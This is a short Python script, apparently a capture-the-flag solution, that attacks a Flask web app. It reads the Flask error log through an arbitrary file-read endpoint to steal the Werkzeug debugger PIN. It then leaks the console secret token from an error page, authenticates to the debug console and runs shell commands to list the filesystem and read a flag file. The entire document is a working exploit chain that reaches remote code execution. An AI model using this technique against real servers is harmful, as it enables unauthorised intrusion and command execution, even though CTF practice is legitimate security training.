import requests
import re
import sys

url = sys.argv[1] if len(sys.argv) > 1 else 'http://localhost:1337'

s = requests.Session()

r = s.post(f'{url}/get_file', data={'filename': '/app/logs/flask-error.log'})
# print(r.text)
# find the pin code
pin_code = re.search(r'PIN: (\d+-\d+-\d+)', r.text).group(1)
print(f'Pin code: {pin_code}')

# fetch console token from html error messages (only needed if logging in headlessly)
r = s.post(f'{url}/get_file', data={'filename': '/file_that_does_not_exist'})
# print(r.text)
console_token = re.search(r'SECRET = "(.*)";', r.text).group(1)
print(f'Console token : {console_token}')

# get auth cookie from flask by performing pinauth
r = s.get(f'{url}/console', params={'__debugger__': 'yes', 'cmd': 'pinauth', 'pin': pin_code, 's': console_token})

# execute ls in the console
r = s.get(f'{url}/console', params={'__debugger__': 'yes', 'cmd': 'import subprocess; print(subprocess.check_output(["ls", "/"]).decode())', 'frm': 0, 's': console_token})

flag_file = re.search(r'flag-\w+.txt', r.text).group(0)
# read the flag file
r = s.get(f'{url}/console', params={'__debugger__': 'yes', 'cmd': f'import subprocess; print(subprocess.check_output(["cat", "/{flag_file}"]).decode())', 'frm': 0, 's': console_token})
print(r.text)
